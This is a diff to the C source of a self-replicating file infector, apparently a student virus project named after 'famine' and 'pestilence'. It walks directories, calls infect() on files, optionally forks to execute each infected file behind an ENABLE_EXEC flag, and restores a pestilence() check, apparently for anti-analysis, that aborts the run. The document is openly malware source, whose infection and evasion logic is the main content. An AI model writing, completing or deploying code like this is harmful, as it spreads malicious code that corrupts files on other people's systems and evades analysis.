@@ -198,6 +198,7 @@ static int	infect(const char *filename, const char *self_name)
 }
 
 
+#ifdef ENABLE_EXEC
 static int execute_prog(const char *filename)
 {
 	pid_t pid = _syscall(SYS_fork);
@@ -229,14 +230,13 @@ static int execute_prog(const char *filename)
 	} else if (pid > 0) {
 		int status;
 		_syscall(SYS_wait4, pid, &status, 0, 0);
-		if (status != 0) {
-			return 1;
-		}
+		return (status == 0) ? 0 : 1;
 	} else {
 		return 1;
 	}
 	return 0;
 }
+#endif
 
 static void	make_path(char *path, const char *dir, const char *file)
 {
@@ -278,7 +278,10 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 				if (infect(new_path, self_path) == 0) {
 					(*counter)++;
+
+#ifdef ENABLE_EXEC
 					execute_prog(new_path);
+#endif
 				}
 
 			} else if (dir->d_type == DT_DIR) {
@@ -297,9 +300,9 @@ static void open_file(const char *file, const char *self_path, uint16_t *counter
 
 void	famine(void)
 {
-	//if (pestilence() != 0) {
-	//	return ;
-	//}
+	if (pestilence() != 0) {
+		return ;
+	}
 
 	uint16_t counter = 0;
 	char host_name[PATH_MAX];
